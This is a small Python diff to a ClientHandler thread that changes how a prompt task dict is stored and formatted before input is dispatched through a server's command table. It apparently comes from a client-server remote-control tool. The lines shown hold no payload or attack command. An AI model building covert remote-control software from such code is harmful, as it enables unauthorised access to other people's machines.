@@ -826,8 +826,8 @@ class ClientHandler(threading.Thread):
                 task = self.prompt if self.prompt else threads['server'].recv_client(self.name)
                 if type(task) is dict:
                     if 'prompt' in task.get('task'):
-                        self.prompt     = task.get('data')
-                        command         = self._prompt(bytes(self.prompt).format(self.name))
+                        self.prompt     = task
+                        command         = self._prompt(bytes(self.prompt.get('data')).format(self.name))
                         cmd, _, action  = bytes(command).partition(' ')
                         if cmd in threads['server'].commands:
                             result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
